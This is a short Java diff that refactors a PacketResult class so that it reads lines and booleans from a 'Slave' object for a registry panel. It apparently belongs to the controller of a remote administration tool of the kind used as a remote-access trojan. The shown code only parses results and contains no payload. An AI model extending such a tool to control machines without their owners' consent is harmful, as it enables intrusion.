@@ -9,12 +9,12 @@ import java.io.DataInputStream;
 public class PacketResult extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		String path = slave.readLine();
 
 		PanelRegistry frame = (PanelRegistry) slave.getPanel(PanelRegistry.class);
 
-		while (dis.readBoolean()) {
+		while (slave.readBoolean()) {
 			String line = slave.readLine();
 
 			String[] args = line.trim().split("    ");
